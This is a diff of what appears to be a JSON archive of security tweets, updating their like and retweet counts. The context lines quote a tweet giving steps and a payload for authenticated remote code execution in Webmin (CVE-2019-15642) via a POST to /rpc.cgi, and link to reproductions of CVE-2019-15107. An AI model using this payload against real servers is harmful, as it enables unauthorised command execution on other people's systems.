@@ -12,10 +12,10 @@
     "username": "chybeta"
 }
 {
-    "tweetfavorites": 724,
+    "tweetfavorites": 702,
     "tweetquotes": 10,
-    "tweetreplies": 11,
-    "tweetretweets": 363,
+    "tweetreplies": 10,
+    "tweetretweets": 353,
     "tweettext": "CVE-2019-15642 another Webmin Remote Code Execution (authenticated)  \n\n1. set User-Agent as webmin  \n2. set Authorization \n3. set payload:\nOBJECT CGI;print \"Content-Type: chybeta\\n\\n\";$cmd=`id`;print \"$cmd\";\n4. post to /rpc.cgi https://t.co/boPYXpLpEv",
     "tweettime": "2019-08-31, 01:58:16",
     "tweeturl": "https://twitter.com/chybeta/status/1167617571287289856",
@@ -111,10 +111,10 @@
     "expanded_url": [
         "https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107"
     ],
-    "tweetfavorites": 253,
+    "tweetfavorites": 248,
     "tweetquotes": 6,
-    "tweetreplies": 2,
-    "tweetretweets": 111,
+    "tweetreplies": 1,
+    "tweetretweets": 102,
     "tweettext": "Webmin Unauthenticated Remote Code Execution 0DAY (CVE-2019-15107)\n\nUse #Vulhub# to simply reproduce the vulnerability here:\nhttps://t.co/p7dPv8jYzH https://t.co/0MIRzvr6oh",
     "tweettime": "2019-08-17, 21:43:18",
     "tweeturl": "https://twitter.com/phithon_xg/status/1162842364206993408",
@@ -134,7 +134,7 @@
     "expanded_url": [
         "https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html"
     ],
-    "tweetfavorites": 840,
+    "tweetfavorites": 841,
     "tweetquotes": 8,
     "tweetreplies": 6,
     "tweetretweets": 434,
